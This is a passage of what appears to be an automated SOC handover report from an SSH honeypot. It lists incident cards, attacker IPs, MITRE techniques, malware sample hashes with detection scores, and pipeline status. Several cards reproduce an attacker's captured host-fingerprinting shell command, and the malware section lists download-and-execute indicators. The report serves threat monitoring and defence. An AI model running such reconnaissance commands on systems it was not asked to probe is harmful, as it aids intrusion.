| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:50:42` | `cowrie.session.connect` |
| `2026-08-10 18:50:43` | `cowrie.client.version` |
| `2026-08-10 18:50:43` | `cowrie.client.kex` |
| `2026-08-10 18:50:46` | `cowrie.login.success` |
| `2026-08-10 18:50:48` | `cowrie.session.params` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.success` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:48` | `cowrie.command.input` |
| `2026-08-10 18:50:49` | `cowrie.log.closed` |
| `2026-08-10 18:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab78dbd9a8c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-08-10 18:52 |
| **Last Seen** | 2026-08-10 18:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:52:55` | `cowrie.session.connect` |
| `2026-08-10 18:52:56` | `cowrie.client.version` |
| `2026-08-10 18:52:56` | `cowrie.client.kex` |
| `2026-08-10 18:52:58` | `cowrie.login.success` |
| `2026-08-10 18:53:00` | `cowrie.session.params` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.success` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.command.input` |
| `2026-08-10 18:53:00` | `cowrie.log.closed` |
| `2026-08-10 18:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54beb6c28af

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-08-10 18:54 |
| **Last Seen** | 2026-08-10 18:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:54:01` | `cowrie.session.connect` |
| `2026-08-10 18:54:02` | `cowrie.client.version` |
| `2026-08-10 18:54:02` | `cowrie.client.kex` |
| `2026-08-10 18:54:04` | `cowrie.login.success` |
| `2026-08-10 18:54:05` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb9d8566217

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-10 18:54 |
| **Last Seen** | 2026-08-10 18:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:54:15` | `cowrie.session.connect` |
| `2026-08-10 18:54:16` | `cowrie.client.version` |
| `2026-08-10 18:54:16` | `cowrie.client.kex` |
| `2026-08-10 18:54:18` | `cowrie.login.success` |
| `2026-08-10 18:54:19` | `cowrie.direct-tcpip.request` |
| `2026-08-10 18:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a46e57751fd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-10 18:54 |
| **Last Seen** | 2026-08-10 18:54 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 18:54:38` | `cowrie.session.connect` |
| `2026-08-10 18:54:39` | `cowrie.client.version` |
| `2026-08-10 18:54:39` | `cowrie.client.kex` |
| `2026-08-10 18:54:46` | `cowrie.login.success` |
| `2026-08-10 18:54:49` | `cowrie.session.params` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.success` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:49` | `cowrie.command.input` |
| `2026-08-10 18:54:50` | `cowrie.log.closed` |
| `2026-08-10 18:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **43** | 2026-08-10 16:55 | 2026-08-10 18:51 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `47.236.54[.]176` | **14** | 2026-08-10 16:58 | 2026-08-10 18:24 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-10 17:19 | 2026-08-10 18:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-10 18:44 | 2026-08-10 18:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-10 17:08 | 2026-08-10 17:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-08-10 18:28 | 2026-08-10 18:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `50.89.84[.]188` | **3** | 2026-08-10 18:21 | 2026-08-10 18:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-08-10 17:29 | 2026-08-10 17:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.157[.]138` | **2** | 2026-08-10 17:47 | 2026-08-10 17:49 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-08-10 17:28 | 2026-08-10 17:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **2** | 2026-08-10 17:49 | 2026-08-10 17:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-08-10 18:04 | 2026-08-10 18:31 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.105[.]186` | **2** | 2026-08-10 18:31 | 2026-08-10 18:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-08-10 17:27 | 2026-08-10 17:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-10 18:20 | 2026-08-10 18:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]70` | 1 | 2026-08-10 17:45 | 2026-08-10 17:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `108.58.76[.]122` | 1 | 2026-08-10 18:16 | 2026-08-10 18:16 | 11s | 0 | `T1592` | 🟢 LOW |
| `118.122.196[.]230` | 1 | 2026-08-10 17:01 | 2026-08-10 17:01 | 5s | 0 | `T1592` | 🟢 LOW |
| `123.133.101[.]151` | 1 | 2026-08-10 18:18 | 2026-08-10 18:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `157.173.103[.]179` | 1 | 2026-08-10 17:57 | 2026-08-10 17:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]204` | 1 | 2026-08-10 18:47 | 2026-08-10 18:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.52[.]146` | 1 | 2026-08-10 17:06 | 2026-08-10 17:06 | 4s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-08-10 17:35 | 2026-08-10 17:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-10 18:00 | 2026-08-10 18:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-08-10 18:22 | 2026-08-10 18:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-08-10 18:45 | 2026-08-10 18:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.15.224[.]102` | 1 | 2026-08-10 18:22 | 2026-08-10 18:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.206.136[.]24` | 1 | 2026-08-10 17:50 | 2026-08-10 17:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-10 16:57 | 2026-08-10 16:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.37.150[.]6` | 1 | 2026-08-10 17:48 | 2026-08-10 17:48 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `149.28.138[.]88` | SG | Vultr Holdings, LLC | **100** ⚠️ | 0 |
| `210.0.90[.]82` | AU | AAPT Limited | **100** ⚠️ | 50 |
| `178.178.194[.]131` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `218.15.224[.]102` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 13 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `27.223.98[.]117` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `157.173.103[.]179` | FR | Contabo GmbH | **100** ⚠️ | 5 |
| `34.146.217[.]105` | JP | Google LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 72 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 17 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 16 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 186 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (14.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 54 priority case(s) shown individually · 30 recon entry/entries in table (15 group(s) consolidating 90 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
